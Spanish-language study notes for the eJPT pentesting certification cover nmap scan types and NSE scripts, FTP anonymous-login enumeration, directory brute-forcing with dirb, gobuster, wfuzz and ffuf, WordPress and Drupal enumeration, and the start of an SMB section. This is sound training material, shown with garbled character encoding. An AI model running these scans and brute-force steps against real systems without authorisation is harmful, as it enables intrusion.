#apuntes #certificacion #eJPT  

# ğŸ“Œ nmap

**Network Mapper**
Esta herramienta nos permite conocer mejor la red con la que estamos trabajando. Viene instalada por defecto en kali y Parrot. Podemos ver los puertos abiertos y cerrados.

URL web oficial: [[https://nmap.org/man/es/|nmap]]

---
## 1. CaracterÃ­sticas

### 1.1 Network Mapper

Herramienta que permite conocer mejor la red con la que estamos trabajando. Viene instalada por defecto en Kali y Parrot. Sirve para identificar **puertos abiertos/cerrados**, servicios y sistemas operativos.  
### 1.2 Network scanning

Realiza diferentes tipos de escaneo (ping, TCP, UDP, SYN, etc.) para mapear el estado de los puertos.  
### 1.3 Objetivo

ğŸ”¹ **Network exploration:** explorar y mapear la red.

#### ğŸ”¹ **Security auditing:** auditar sistemas, detectar vulnerabilidades y comprobar configuraciones de seguridad.  

### 1.4 Descubrir

#### ğŸ”¹ **Dispositivos disponibles en la red** (hosts activos).  

#### ğŸ”¹ **Servicios y versiones** que se estÃ¡n ejecutando en cada puerto.  

#### ğŸ”¹ **Sistema operativo** y caracterÃ­sticas de la mÃ¡quina objetivo.  

### 1.5 Usada por profesionales de seguridad y por sysadmin

- Profesionales de **seguridad** para pentesting y auditorÃ­as.  
- **Administradores de sistemas** para inventario, monitorizaciÃ³n y resoluciÃ³n de incidencias.  

---
## 2. Escaneos

	Antes de nada, es importante conocer el funcionamiento del comando ifconfig para descubrir las    
	interfaces de red que el sistema tiene disponibles y su configuraciÃ³n actual.
### 2.1 Salida de `ifconfig`
![[Pasted image 20250907150853.png]]
- **`eth0` â†’ Interfaz Ethernet (red real o virtual)**
    - Es la tarjeta de red principal que conecta tu mÃ¡quina al resto de la red.
    - Tiene asignada una **direcciÃ³n IPv4** (`10.0.2.15`), una **mÃ¡scara de subred** y una **direcciÃ³n MAC**.
    - TambiÃ©n puede tener direcciones **IPv6**.
    - A travÃ©s de esta interfaz tu mÃ¡quina se comunica con otras mÃ¡quinas en la red local o hacia internet.
- **`lo` â†’ Interfaz loopback (localhost)**
    - Es una interfaz **virtual** que no sale de la mÃ¡quina.
    - Siempre usa la direcciÃ³n IP `127.0.0.1`.
    - Sirve para que un sistema pueda comunicarse **consigo mismo**, muy Ãºtil para pruebas de red y aplicaciones locales.
    - Ejemplo: cuando accedes a `http://127.0.0.1:8080`, estÃ¡s entrando a un servicio que corre en tu propio equipo.
#### ğŸ”¹Interfaz `eth0` (Ethernet)
| Campo                                              | DescripciÃ³n                                                                                                             |
| -------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| flags=4163<br><UP,BROADCAST,<br>RUNNING,MULTICAST> | Estado de la interfaz: UP (activa), BROADCAST (permite broadcast), RUNNING (funcionando), MULTICAST (acepta multicast). |
| mtu 1500                                           | TamaÃ±o mÃ¡ximo de los paquetes (1500 bytes).                                                                             |
| inet 10.0.2.15                                     | DirecciÃ³n IPv4 asignada.                                                                                                |
| netmask 255.255.255.0                              | MÃ¡scara de subred (/24).                                                                                                |
| broadcast 10.0.2.255                               | DirecciÃ³n de broadcast de la red.                                                                                       |
| inet6 ...                                          | Direcciones IPv6 asignadas (global y link-local).                                                                       |
| ether 08:00:27:59:3c:17                            | DirecciÃ³n MAC de la tarjeta de red.                                                                                     |
| txqueuelen 1000                                    | TamaÃ±o de la cola de transmisiÃ³n.                                                                                       |
| RX packets / bytes                                 | Paquetes y bytes **recibidos** (â‰ˆ2.3 GiB).                                                                              |
| TX packets / bytes                                 | Paquetes y bytes **enviados** (â‰ˆ610 MiB).                                                                               |
| RX/TX errors, dropped, overruns, collisions        | EstadÃ­sticas de errores â†’ todo en 0 (sin problemas de red).                                                             |
#### ğŸ”¹Interfaz `lo` (Loopback)
| Campo | DescripciÃ³n |
|-------|-------------|
| flags=73<UP,LOOPBACK,RUNNING> | Estado: activa, loopback (interfaz interna). |
| mtu 65536 | TamaÃ±o mÃ¡ximo de los paquetes. |
| inet 127.0.0.1 | DirecciÃ³n IPv4 (localhost). |
| netmask 255.0.0.0 | MÃ¡scara de subred estÃ¡ndar para loopback. |
| RX/TX packets / bytes | Paquetes transmitidos y recibidos localmente. |
| RX/TX errors... | EstadÃ­sticas de errores (normalmente 0). |
## 2.2 **Tipos de escaneo (mÃ©todo de descubrimiento de puertos)**

Estos definen **cÃ³mo Nmap interactÃºa con el puerto** para determinar si estÃ¡ abierto, cerrado o filtrado.

ğŸ“Œ **Ejemplo prÃ¡ctico:**

`nmap -sS -p- [IP]   # Escaneo SYN de todos los puertos`
### ğŸ”¹ğŸ‘‰ **-sS: TCP SYN Scan (por defecto)**  
  Escaneo rÃ¡pido y sigiloso que envÃ­a un paquete SYN. Si recibe SYN/ACK â†’ puerto abierto, si recibe RST â†’ puerto cerrado. No completa la conexiÃ³n (half-open scan). 

### **ğŸ”¹ sT: TCP Connect() Scan**  
  Completa la conexiÃ³n TCP con el sistema objetivo. Menos sigiloso porque queda registrado en logs, pero no requiere privilegios de root.  

### **ğŸ”¹ sA: ACK Scan**  
  EnvÃ­a paquetes ACK para mapear reglas de firewall y distinguir si un puerto estÃ¡ filtrado o no. No determina si un puerto estÃ¡ abierto o cerrado.  

### ğŸ”¹ sW: Window Scan**  
  Variante del ACK Scan que analiza el tamaÃ±o de la ventana TCP en la respuesta para inferir el estado del puerto.  

### ğŸ”¹sM: Maimon Scan**  
  Escaneo menos comÃºn que explota un comportamiento descrito por Uriel Maimon en ciertos sistemas TCP.  

### ğŸ”¹sU: UDP Scan**  
  Escanea puertos UDP. MÃ¡s lento que TCP porque muchos servicios no responden fÃ¡cilmente, requiriendo retransmisiones.  

### ğŸ”¹sN: Null Scan**  
  EnvÃ­a paquetes TCP sin flags. Un puerto abierto no deberÃ­a responder; uno cerrado suele devolver un RST.  

### ğŸ”¹sF: FIN Scan**  
  EnvÃ­a un paquete con el flag FIN. Los puertos cerrados responden con RST, los abiertos no responden.  

### ğŸ”¹sX: Xmas Scan**  
  EnvÃ­a un paquete con los flags FIN, PSH y URG encendidos (como un "Ã¡rbol de navidad"). Similar al Null y FIN Scan para detectar puertos abiertos/cerrados.  

## 2.3 **Opciones/comandos adicionales (parÃ¡metros que complementan el escaneo)**

Estos no cambian la forma en que Nmap envÃ­a los paquetes, sino que **aÃ±aden funciones**

ğŸ“Œ **Ejemplo prÃ¡ctico:**

`nmap -sS -sV -O -p- --min-rate 5000 [IP]`

	`-sS` define **cÃ³mo se hace el escaneo**
    `-sV -O -p- --min-rate` son **opciones que complementan el escaneo**

`nmap [IP]`

	por defecto hace un escaneo del Top1000 de puertos mas usados y solo devolvera los que encuentre    
	abiertos sin mas informacion.

`nmap -p- [IP]
`nmap 1-65535 [IP]

	Si queremos escanear todos los puertos (65535)

![[Pasted image 20250907155921.png]]
![[Pasted image 20250907175808.png]]
### ğŸ”¹ OpciÃ³n `-v / -vv`

- **DescripciÃ³n:** Muestra informaciÃ³n detallada (verbose) del escaneo. A medida que encuentre puertos abiertos los va volcando la info del escaneo a tiempo real. Lo podemos usar si tarda mucho como un reconocimiento inicial. Aunque de cara a las certificaciones y coger capturas no va bien.
    
- **Ejemplo:**
    

```bash
nmap [IP] -v
nmap [IP] -vv
```

### ğŸ”¹ ğŸ‘‰OpciÃ³n `-sV`

- **DescripciÃ³n:** Detecta el servicio y la **versiÃ³n** que se ejecuta en los puertos que estÃ¡n abiertos.
    
- **Ejemplo:**
    

```bash
nmap -sV [IP]
```


### ğŸ”¹ ğŸ‘‰OpciÃ³n `-oN

- **DescripciÃ³n:** Exporta los resultados de nmap a un fichero de texto.
    
- **Ejemplo:**
    

```
nmap -oN [nombre del fichero] [IP] 
```

### ğŸ”¹ OpciÃ³n `-O`

- **DescripciÃ³n:** Identifica el **sistema operativo** del host.
    
- **Ejemplo:**
    

```
nmap -O [IP]
```

### ğŸ”¹ OpciÃ³n `-oA`

- **DescripciÃ³n:** Exporta los resultados del escaneo en **tres formatos**:
    
    - Normal (`.nmap`)
        
    - Grepable (`.gnmap`)
        
    - XML (`.xml`)
        
- **Ejemplo:**
    

```bash
nmap -oA resultado [IP]
```

_(Genera: `resultado.nmap`, `resultado.gnmap`, `resultado.xml`)_

### ğŸ”¹ğŸ‘‰OpciÃ³n `-sC`

- **DescripciÃ³n:** Ejecuta los **scripts por defecto** de Nmap (NSE).
    
- **Ejemplo:**
    

```bash
nmap -sC [IP]
```

### ğŸ”¹ OpciÃ³n `--min-rate

- **DescripciÃ³n:** EnvÃ­a los paquetes a una velocidad mÃ­nima especificada (en paquetes por segundo).  
	
	Ãštil para acelerar el escaneo.  
    
- **Ejemplo:**
    un min rate de 5000 va hacer que tarde mucho menos nmap en ejecutar. Como contra, puede hacer que nos dejemos informaciÃ³n por el camino, aunque para el eJPT nos agiliza los tiempos.

```bash
nmap --min-rate 5000 [IP]
```

### ğŸ”¹ OpciÃ³n `-T

- **DescripciÃ³n:** Le indicas un valor del 0 al 5 y cuando mayor sea el valor, mas rÃ¡pido ira. **Escaneo Agresivo** (Muchas peticiones al servidor que dejan rastro). 
	
	Es como usar un --min-rate pero con otra escala de valores y mas funcional.


### ğŸ”¹ğŸ‘‰ OpciÃ³n `-Pn`

- **DescripciÃ³n:** Trata al host como **online**, sin hacer ping previo.  Algunas veces nos lo pedirÃ¡ el propio nmap cuando la maquina no responda a los pings que estamos lanzando
    Se usa cuando ICMP estÃ¡ bloqueado por firewall.
    
- **Ejemplo:**
    

```bash
nmap -Pn [IP]
```

---

### ğŸ”¹ OpciÃ³n `--traceroute`

- **DescripciÃ³n:** Muestra los **saltos de red** (routers intermedios) hasta el objetivo. No se usa tanto para descubrir servicios, sino para **entender la topologÃ­a de red entre tu mÃ¡quina y el objetivo**. Esto es importante en un pentest (y en el eJPT) por varias razones:
#### ğŸ” Â¿Por quÃ© interesa conocer los saltos de red?

1. **IdentificaciÃ³n de Firewalls y Filtrado**
    - Si un traceroute se detiene en cierto salto o empieza a mostrar _timeouts_, puede indicar la presencia de un firewall, IDS/IPS o reglas de filtrado.
        
    - Ejemplo: Si no llegas al host pero ves que muere en un salto intermedio, probablemente hay filtrado en el camino.
        
2. **Reconocimiento de la infraestructura**
    - Permite ver **quÃ© routers intermedios existen** entre tÃº y el objetivo.
        
    - Puede revelar informaciÃ³n de **proveedores de red, IPs internas o externas** que normalmente no se verÃ­an.
        
3. **DetecciÃ³n de NAT o segmentaciÃ³n de red**
    - Si el Ãºltimo salto visible es una IP pÃºblica y despuÃ©s el host responde con una IP interna (privada), podemos inferir que estÃ¡ detrÃ¡s de un **NAT o segmentado en una red privada**.
        
4. **Ayuda en Pivoting y Movimiento Lateral**
    - Saber cÃ³mo llegas a la mÃ¡quina te da pistas de quÃ© otras redes existen detrÃ¡s.
        
    - En pruebas avanzadas, estos datos ayudan a planear un **pivoting** o un ataque en entornos con mÃºltiples subredes.
        
5. **OptimizaciÃ³n de ataques**
    - Si ves que la conexiÃ³n pasa por varios saltos con latencia alta, puedes ajustar herramientas (como Nmap con `--min-rate` o `--max-retries`) para que sean mÃ¡s eficientes.
- **Ejemplo:**
    

```bash
nmap --traceroute [IP]
```

---

### ğŸ”¹ OpciÃ³n `-p`

- **DescripciÃ³n:** Permite definir **puertos especÃ­ficos** a escanear.
    
- **Ejemplos:**
    

```bash
nmap -p22 [IP]          # Escanear solo el puerto 22
nmap -p21,22,80 [IP]    # Escanear mÃºltiples puertos
nmap -p- [IP]           # Escanear todos los puertos (1-65535)
```

---

### ğŸ”¹ğŸ‘‰ OpciÃ³n `-A`

- **DescripciÃ³n:** Escaneo agresivo. Incluye:
    
    - DetecciÃ³n de sistema operativo
        
    - VersiÃ³n de servicios
        
    - Scripts NSE por defecto
        
    - Traceroute
        
- **Ejemplo:**
    

```bash
nmap -A [IP]
```

---
## 2.4 Escaneos

### ğŸ”¹ Escaneo completo de puertos con detecciÃ³n de servicios

```bash
nmap -p- -sV --min-rate 5000 [IP]
```

- `-p-` â†’ Escanea **todos los puertos (1-65535)**
    
- `-sV` â†’ Detecta el **servicio y la versiÃ³n** que corre en el puerto
    
- `--min-rate 5000` â†’ Asegura que se envÃ­en al menos **5000 paquetes por segundo** (mÃ¡s rÃ¡pido)
    

### ğŸ”¹ Escaneo agresivo

```bash
nmap -A [IP]
```

- Incluye:
    
    - DetecciÃ³n de **SO**
        
    - DetecciÃ³n de **versiÃ³n de servicios**
        
    - EjecuciÃ³n de **scripts NSE por defecto**
        
    - **Traceroute**
        

### ğŸ”¹ Escaneo enfocado en SMB

```bash
nmap -p139,445 --script=*smb* [IP]
```

- `-p139,445` â†’ Escanea los puertos de **SMB**
    
- `--script=*smb*` â†’ Ejecuta los scripts NSE relacionados con **SMB**  
    (ejemplo: enumeraciÃ³n de usuarios, vulnerabilidades conocidas como EternalBlue, etc.)
    

âœ… Este escaneo es Ãºtil para **detecciÃ³n de vulnerabilidades SMB** en entornos Windows.


---
## 2.5 Scripts

###  Nmap Scripting Engine (NSE)

#### ğŸ”¹ Â¿QuÃ© es?
El **Nmap Scripting Engine (NSE)** permite ampliar las funcionalidades de Nmap mediante **scripts en Lua**.  
Estos scripts estÃ¡n diseÃ±ados para:  
- Detectar versiones e informaciÃ³n detallada del objetivo  
- Detectar **vulnerabilidades**  
- Explotar vulnerabilidades conocidas  
#### ğŸ”¹ UbicaciÃ³n de scripts
Los scripts por defecto de Nmap se encuentran en:

`/usr/share/nmap/scripts`

#### ğŸ”¹ EjecuciÃ³n de scripts

Se ejecutan con la opciÃ³n `--script`:
````
nmap [IP] --script=[nombre_script]
````
 
 Ejemplo:
````
nmap [IP] --script=[nombre_script]
````
 (Muestra el tÃ­tulo de las pÃ¡ginas web que corren en el host)

#### ğŸ”¹ Uso de comodines

Se pueden ejecutar varios scripts de una categorÃ­a usando comodines:

```
nmap [IP] --script="http-*"
```
(Ejecuta todos los scripts relacionados con HTTP)

#### ğŸ”¹ CategorÃ­as de scripts NSE

Algunos grupos comunes de scripts:

- `auth` â†’ autenticaciÃ³n
- `brute` â†’ fuerza bruta
- `discovery` â†’ descubrimiento de servicios
- `vuln` â†’ bÃºsqueda de vulnerabilidades
- `exploit` â†’ explotaciÃ³n directa

âœ… NSE es muy Ãºtil para automatizar pruebas especÃ­ficas (como SMB, HTTP, FTP, etc.) sin tener que usar herramientas externas

![[Pasted image 20250907184035.png]]

####  CategorÃ­as de Scripts NSE (Nmap Scripting Engine)

> âš ï¸ En el eJPT no es necesario aprender cada uno en detalle, pero sÃ­ entender para quÃ© sirven en general.

### ğŸ”¹ Auth
- Scripts relacionados con **autenticaciÃ³n**.  
- Ej: probar credenciales, enumerar mÃ©todos de login.  

### ğŸ”¹ Broadcast
- Escanean mÃºltiples hosts a travÃ©s de la red local.  
- Ãštiles para descubrimiento rÃ¡pido de servicios.  

### ğŸ”¹ Default
- Scripts que se ejecutan con `-sC`.  
- DiseÃ±ados para ser **seguros y rÃ¡pidos**.  

### ğŸ”¹ Discovery
- Descubren informaciÃ³n adicional sobre el objetivo.  
- Ej: nombres de host, rutas, recursos compartidos.  

### ğŸ”¹ Dos
- Scripts de **Denial of Service** (DoS).  
- âš ï¸ No se usan en entornos legales de pentest bÃ¡sico.  

### ğŸ”¹ Exploit
- Intentan **explotar vulnerabilidades** conocidas.  
- Ej: SMB exploits, HTTP exploits.  

### ğŸ”¹ External
- Dependen de **servicios externos** (p. ej., consultar reputaciÃ³n de IPs en bases de datos online).  

### ğŸ”¹ Fuzzer
- Scripts que realizan **fuzzing** enviando entradas inesperadas.  
- Ãštiles para detectar comportamientos anÃ³malos.  

### ğŸ”¹ Intrusive
- Pueden ser **invasivos** y generar efectos secundarios.  
- Ej: intentos de login por fuerza bruta.  

### ğŸ”¹ Malware
- Detectan posibles **infecciones o backdoors** conocidas.  

### ğŸ”¹ Safe
- Scripts considerados **seguros** para usarse sin impacto negativo.  
- âš–ï¸ Son los recomendados en entornos productivos.  

### ğŸ”¹ Version
- Recopilan informaciÃ³n sobre **versiones de servicios** (complemento de `-sV`).  

### ğŸ”¹ Vuln
- Buscan **vulnerabilidades conocidas** en los servicios detectados.  
- Ej: detecciÃ³n de Heartbleed, MS17-010 (EternalBlue), etc.  

---

âœ… En la prÃ¡ctica para el eJPT, las mÃ¡s Ãºtiles suelen ser:  
- **Default**, **Discovery**, **Version** y **Vuln**.  
- Ejemplo:
```
nmap -p80,443 --script=vuln [IP]
```


## ğŸ“ Ejercicio prÃ¡ctico

EstÃ¡s en un laboratorio de Pentesting.  
Tienes una mÃ¡quina vÃ­ctima con IP `192.168.1.35`.

1. **Identifica puertos abiertos** (es decir, en quÃ© interfaces estÃ¡ escuchando el servidor):
    
    `sudo nmap -p- --open --min-rate 5000 -sS -n -Pn 192.168.1.35 -oN ports`
    
    ğŸ‘‰ Resultado esperado (ejemplo):
    
    `PORT      STATE SERVICE 22/tcp    open  ssh 80/tcp    open  http 3306/tcp  open  mysql`
    
2. **Enumera los servicios que se ejecutan en esos puertos**:
    
    `nmap -p22,80,3306 -sCV 192.168.1.35 -oN services`
    
    ğŸ‘‰ Resultado esperado (ejemplo):
    
    `22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 80/tcp   open  http    Apache httpd 2.4.29 3306/tcp open  mysql   MySQL 5.7.33`
    
3. **Analiza la relaciÃ³n con la teorÃ­a:**
    
    - La **interfaz de red** de la vÃ­ctima es la que tiene la IP `192.168.1.35`.
        
    - El **servidor** estÃ¡ ofreciendo mÃºltiples servicios:
        
        - SSH en el puerto 22.
            
        - Web en el puerto 80.
            
        - Base de datos en el puerto 3306.
            

ğŸ‘‰ **ConclusiÃ³n:** gracias a Nmap ves cÃ³mo un servidor utiliza su interfaz de red para exponer servicios a travÃ©s de diferentes puertos.

---

#  ğŸ“Œ FTP (File Transfer Protocol)

## ğŸ”¹ DefiniciÃ³n
Protocolo para **transferir archivos** entre equipos conectados a una misma red.  

 **Puerto por defecto:** `21/tcp`.  A veces lo vamos a encontrar en otros puertos. De ahi la importancia  de hacer el nmap sobre todos los puertos con el -sV para ver que servicio hay detras de cada uno de esos puertos.
 
 Intercambio de ficheros **sin cifrado** â†’ inseguro.  No se deberÃ­a utilizar y estÃ¡ pensado para dar la mÃ¡xima velocidad de conexiÃ³n. Incluso no nos cifraria el propio login del usuario en caso de ser necesario.

Versiones seguras a dÃ­a de hoy:
  - **SFTP** (Secure FTP sobre SSH)  
  - **SCP** (Secure Copy)  

---

## ğŸ” EnumeraciÃ³n FTP

### 1. Obtener la cabecera con Netcat

```
nc -vn [IP] 21
```

- Permite ver el **banner** del servicio (versiÃ³n, software).
    
- Ejemplo: `220 (vsFTPd 2.3.4)`
    

---

### 2. Escaneo con Nmap

```bash
nmap -p21 -sC [IP] 
nmap -p21 --script=*ftp* [IP]
nmap -p21 -sV [IP]
```

- `-sC` â†’ Scripts NSE por defecto (detecta login anÃ³nimo, info del servidor).
    
- `--script=*ftp*` â†’ Ejecuta todos los scripts relacionados con FTP.
    
- `-sV` â†’ DetecciÃ³n de versiÃ³n del servicio.
    

ğŸ“Œ Ejemplo de resultado:

```
21/tcp open  ftp     vsftpd 2.3.4
| ftp-anon: Anonymous FTP login allowed (230)
| ftp-syst:
|   STAT: FTP server status
|   Connected to 10.0.3.7
|   Logged in as ftp
|   TYPE: ASCII
```

---

### 3. Conectarse al servidor FTP

```bash
ftp [IP]
```

- Si permite **login anÃ³nimo**:
    
    - Usuario: `anonymous`
        
    - ContraseÃ±a: cualquier valor (o vacÃ­o).
        

---

## ğŸ“‚ Uso de comandos FTP

Dentro de la sesiÃ³n FTP, algunos comandos Ãºtiles son:

- `ls` / `dir` â†’ listar archivos
    
- `cd <directorio>` â†’ cambiar de carpeta
    
- `pwd` â†’ mostrar directorio actual
    
- `get <archivo>` â†’ descargar un archivo del servidor
    
- `put <archivo>` â†’ subir un archivo al servidor
    
- `mget *` â†’ descargar mÃºltiples archivos
    
- `delete <archivo>` â†’ borrar archivo
    
- `bye` / `quit` â†’ salir de la sesiÃ³n
    

---

## ğŸ“ Ejemplo prÃ¡ctico

### Escaneo y detecciÃ³n

```bash
nmap -p21 -sV 10.0.3.9
```

Salida:

```
21/tcp open  ftp   vsftpd 2.3.4
```

### EnumeraciÃ³n con scripts

```bash
nmap -p21 -sV -sC 10.0.3.9
```

Salida:

```
ftp-anon: Anonymous FTP login allowed
ftp-syst: 
  TYPE: ASCII
  Logged in as ftp
```

### ConexiÃ³n anÃ³nima

```bash
ftp 10.0.3.9
Name: anonymous
Password: [cualquiera]
230 Login successful
```

### Transferencia de archivos

```bash
ftp> ls -la
ftp> get flag.txt      # Descargar archivo
ftp> put test.txt      # Subir archivo
```

---

## âš ï¸ Riesgos de FTP

- No cifra credenciales ni archivos â†’ **trÃ¡fico en claro**.
    
- Login anÃ³nimo puede dar acceso a archivos sensibles.
    
- Versiones antiguas como **vsFTPd 2.3.4** tienen vulnerabilidades conocidas.
    

---
# ğŸ“Œ HTTP y Fuerza Bruta de Directorios

## ğŸ”¹ HTTP (HyperText Transfer Protocol)

- Protocolo de la **capa de aplicaciÃ³n** usado para la transmisiÃ³n de documentos hipermedia (HTML).
- Se utiliza en la comunicaciÃ³n entre **navegadores** y **servidores web**.
- **Puertos por defecto**:
	  - `80` â†’ HTTP
	  - `443` â†’ HTTPS
- InformaciÃ³n que puede revelar:
	   -  Servidor y versiÃ³n.
		Apache, ISS?....versiÃ³n?
	  - Lenguaje de programaciÃ³n.
		PHP, ASPnet?
	  - TecnologÃ­as y librerÃ­as.
		CMS
	  - Estructura de directorios y ficheros.
		Funcionalidad de subida de archivos 

---

## ğŸ”¹ EnumeraciÃ³n HTTP

### 1. Nmap

Permite conocer detalles del servidor, mÃ©todos aceptados y directorios/archivos existentes.

Ejemplos:

`# Escaneo con scripts por defecto

````
nmap -p80,443 -sC [IP]
````

Buscamos una pequeÃ±a fuerza bruta de directorios y archivos con un diccionario pequeÃ±o. Puede darnos algo de informaciÃ³n sobre todo si aparecen archivos muy cantosos como un /admin

 `#Escaneo con scripts especÃ­ficos de HTML

````
nmap -p80,443 --script=*html* [IP]
````

## ğŸ”¹ Fuerza Bruta de Directorios

La fuerza bruta de directorios sirve para averiguar si la propia aplicaciÃ³n web tiene algun directorio/archivo que no este visible directamente en una navegaciÃ³n propia del usuario a travÃ©s de Firefox.

Vamos a buscar, si analizando las respuestas del servidor a diferentes rutas, nos devuelve un 200 okey.Si es un 200, es un found y por tanto existe en un servidor.

---
### Herramientas principales

#### ğŸ”¹**dirb** â†’ **escaneo de directorios y archivos con diccionarios**
Vienen por defecto en la Kali linux y nos sirven para el eJPT

#### ğŸ”¹ğŸ‘‰dirsearch â†’ no viene instalada por defecto
```
sudo apt install dirsearch
dirsearch -u [URL] -w [wordlist]
dirsearch -u [URL] -i 200,301
```

#### ğŸ”¹ğŸ‘‰GoBusterâ†’ no viene instalada por defecto
```
sudo apt install gobuster
gobuster dir -u [URL] -w [wordlist]
```
 
#### ğŸ”¹**SecLists** â†’ colecciÃ³n de diccionarios muy usada en pentesting.

#### ğŸ”¹ **CeWL** (Custom Word List) â†’ genera diccionarios a partir de pÃ¡ginas web.

---
### Herramientas extra (fuzzing)

ElÂ **fuzzing es una tÃ©cnica de prueba de seguridad**Â que consiste en enviar datos aleatorios, manipulados o maliciosos a una aplicaciÃ³n o sistema con el objetivo de descubrir vulnerabilidades. BÃ¡sicamente, se trata de Â«alimentarÂ» la aplicaciÃ³n con entradas inesperadas y observar su comportamiento para detectar errores, fallos o condiciones inseguras.

**El objetivo principal del fuzzing**Â es identificar vulnerabilidades que podrÃ­an ser explotadas por atacantes para comprometer la seguridad de un sistema. Al encontrar y corregir estas vulnerabilidades, los desarrolladores pueden fortalecer sus aplicaciones y prevenir posibles brechas de seguridad.

ğŸ”¹ğŸ‘‰ Wfuzzâ†’ Se puede usar tambiÃ©n para hacer fuerza bruta gracias a su potencia, pero se usa mÃ¡s para hacer "fuzzing". 

`# Uso principal: Fuzzing de parÃ¡metros, rutas, cabeceras, POST dataâ€¦ muy flexible.
`# Extra:TambiÃ©n se puede usar en **fuerza bruta** gracias a su potencia.
`# Palabra reservada: `FUZZ` (indica el punto de inyecciÃ³n), donde vamos a cargar las entradas del payload (diccionario).
`# Ventaja: Tiene muchas opciones de filtrado (por cÃ³digo, tamaÃ±o, nÃºmero de palabras o lÃ­neas).
`# Inconveniente: MÃ¡s lento que `ffuf`.

```
wfuzz -w [wordlist] [URL]/FUZZ
```
ejemplo:
```
wfuzz -w /usr/share/wordlists/dirb/common.txt http://target.com/FUZZ
```
Ejemplo con filtro (200 OK):
```
wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ
```

ğŸ”¹ğŸ‘‰ ffufâ†’ 

`# Fuzzing rÃ¡pido y eficiente, diseÃ±ado para ganar velocidad
`# Instalada por defecto en Kali
`# Fuzz Faster U Fool
`# Palabra reservada "FUZZ"
`# Ventaja: Mucho mÃ¡s rÃ¡pido que Wfuzz (usa concurrencia masiva con threads).
`# Inconveniente: Tiene menos opciones avanzadas de filtrado, aunque cubre lo mÃ¡s comÃºn.

```
ffuf -w [wordlist] -u [URL]/FUZZ
```
Ejemplo:
```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ
```
Ejemplo con filtro (200 OK):
```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ -mc 200
```

| Herramienta | Velocidad âš¡ | Flexibilid ğŸ›ï¸ | Filtrado ğŸ”  | Ideal paraâ€¦                                 |
| ----------- | ----------- | -------------- | ------------ | ------------------------------------------- |
| **Wfuzz**   | Media       | Alta           | Muy avanzado | Fuzzing detallado y controlado              |
| **ffuf**    | Muy alta    | Media          | BÃ¡sico       | Enumeraciones rÃ¡pidas y bruteforce de rutas |

---

### ğŸ“‚ Diccionarios en Kali Linux

Ruta comÃºn:

`cd /usr/share/wordlists ls`

Ejemplo de carpetas y archivos:

- `rockyou.txt.gz` (famoso diccionario comprimido).
    
- `dirb/` â†’ contiene listas como `common.txt`, `big.txt`, `small.txt`.
    
- Otros: `fasttrack.txt`, `nmap.lst`, `wfuzz/`, etc.
    

---

### ğŸ› ï¸ Uso de dirb

Ejemplo de fuerza bruta contra un sitio web:

`dirb http://[IP]/usr/share/wordlists/dirb/common.txt`

---

### ğŸ› ï¸ Uso de CeWL

Opciones bÃ¡sicas:

`# Ayuda   

````
cewl -h
````

`# Generar diccionario desde una URL y guardarlo en dict.txt 

```
cewl [URL] -w dict.txt
```  

`# Limitar a profundidad de 9 enlaces 

````
cewl [URL] -m 9`
````

---

## ğŸ”¹ InstalaciÃ³n de SecLists

En Kali:

`sudo apt install seclists`

Diccionarios quedan en:

`/usr/share/seclists`

---
# ğŸ“Œ  HTTP , CMS

## ğŸ”¹ CMS (Content Management System)
- **DefiniciÃ³n:** Plataforma que permite **crear, gestionar y modificar contenido web** sin necesidad de programar desde cero.  
- Son muy utilizados en Internet â†’ objetivos comunes en auditorÃ­as/pentesting.  

### âœ… Importancia en Ciberseguridad
- Son un **target frecuente de ataques**.  
- Presentan gran cantidad de **vulnerabilidades conocidas** (versiones antiguas, plugins inseguros, temas mal programados).  

### âœ… Principales CMS
- **WordPress**
  - El mÃ¡s popular (>40% de webs).  
  - Archivos clave: `wp-config.php`.  
  - Estructura tÃ­pica: `/wp-admin`, `/wp-content/`, `/wp-includes/`.  
- **Drupal**
  - Muy usado en webs institucionales.  
  - Archivos clave: `/sites/default/settings.php`.  
  - Estructura tÃ­pica: `/drupal`, `/modules`, `/themes`.  

---

## ğŸ”¹ RecolecciÃ³n de InformaciÃ³n en CMS
Objetivo: **enumerar al mÃ¡ximo la web para encontrar puntos dÃ©biles**.  

### ğŸ“Œ InformaciÃ³n a obtener
1. **VersiÃ³n del CMS**  
   - Determina si existen vulnerabilidades pÃºblicas.  
   - Plugins/extensiones: *Wappalyzer*, `whatweb`, `wpscan`, `droopescan`.  

2. **Usuarios**  
   - WordPress: enumeraciÃ³n con `wpscan` o fuzzing (`/author=1`, `/author=2`).  
   - Drupal: mÃ³dulos mal configurados pueden exponer usuarios.  

3. **Plugins y MÃ³dulos**  
   - Plugins vulnerables = puerta de entrada muy comÃºn.  
   - WordPress: `wpscan --enumerate p`.  
   - Drupal: `droopescan`.  

4. **Temas**  
   - Enumerar temas usados para buscar exploits conocidos.  

5. **Archivos de ConfiguraciÃ³n (âš ï¸ muy crÃ­ticos)**  
   - **WordPress** â†’ `wp-config.php`  
     - Contiene credenciales de base de datos (`DB_USER`, `DB_PASSWORD`, `DB_NAME`).  
   - **Drupal** â†’ `/sites/default/settings.php`  
     - Contiene parÃ¡metros de conexiÃ³n a la base de datos.  

---

## ğŸ”¹ Herramientas Ãºtiles para enumeraciÃ³n CMS
- **whatweb** â†’ identifica tecnologÃ­as y CMS.  
- **wpscan** â†’ enfocado en WordPress (usuarios, plugins, temas, versiones).  
- **droopescan** â†’ enumeraciÃ³n de Drupal.  
- **gobuster / ffuf / wfuzz** â†’ fuzzing de rutas para descubrir paneles ocultos.  

---

ğŸ“š **Recurso recomendado:**  
ğŸ‘‰ [Wiki Securiters - CMS](https://wiki.securiters.com/securiters-wiki/web/cms)

---
# ğŸ“Œ SMB (Server Message Block)

ğŸ‘‰ En el eJPT, lo mÃ¡s importante es **detectar servicios SMB abiertos (139/445)**, usar herramientas como `nmap`, `smbmap`, `enum4linux` y comprobar:

- **VersiÃ³n del servicio** (para saber si es vulnerable a EternalBlue o similares).
- **Si existen shares accesibles** (especialmente con login anÃ³nimo).
## ğŸ”¹ DefiniciÃ³n
- Protocolo de red usado en **Windows** para compartir:
	  - Archivos
	  - Impresoras
	  - Recursos de red
- Puertos por defecto:
	  - `139/tcp` (NetBIOS Session Service)
	  - `445/tcp` (Microsoft-DS)
